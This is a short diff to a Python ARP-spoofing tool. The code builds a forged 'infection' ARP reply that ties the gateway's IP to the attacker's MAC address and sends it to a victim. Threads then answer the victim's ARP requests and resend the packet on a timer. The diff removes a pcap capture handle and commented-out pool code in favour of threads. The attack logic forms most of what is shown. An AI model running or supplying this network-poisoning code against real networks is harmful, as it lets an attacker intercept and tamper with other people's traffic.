@@ -131,14 +131,6 @@ def main():
     # attack packet
     infection_arp = normal_reply_arp(my_mac, gateway_ip, victim_mac, victim_ip)
 
-    # additionally, grab victim's ARP request and send attack packet
-    pcap_handle = pcap.pcap(timeout_ms=1000)
-    pcap_handle.setfilter('arp')
-
-    # pool = Pool()
-    # replier = pool.spawn(reply_to_request, infection_arp)
-    # periodical = pool.spawn(send_periodically, infection_arp)
-    # pool.join()
     replier = threading.Thread(target=reply_to_request, args=(infection_arp,))
     periodical = threading.Thread(target=send_periodically, args=(infection_arp,))
     replier.start()
